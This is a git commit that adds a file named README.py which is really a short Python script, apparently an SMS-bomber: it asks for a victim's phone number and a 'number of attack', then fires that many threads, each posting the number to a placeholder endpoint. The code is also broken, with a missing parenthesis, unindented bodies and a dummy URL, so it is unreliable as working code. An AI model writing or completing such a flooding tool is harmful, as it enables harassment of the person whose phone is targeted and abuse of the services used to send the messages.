332f93a49004618385ff7d176074b40378b66aff
Chetsadaphon <95066645+Chetsadaphon@users.noreply.github.com>
2021-12-05 17:43:58 +0700

    Update README.py

---
+++ README.py
@@ -0,0 +1,15 @@
+# smss.py
+
+import requests,threading
+from threading import Thread
+
+print("abc")
+phone = input("phone : ")
+z = int(input("number of attack : ")
+
+def a():
+requests.post("http://a.co", data = {"a":phone}, headers = {"abc": "1"})
+print("success")
+
+for i in range(z):
+threading.Thread(target=a).start()
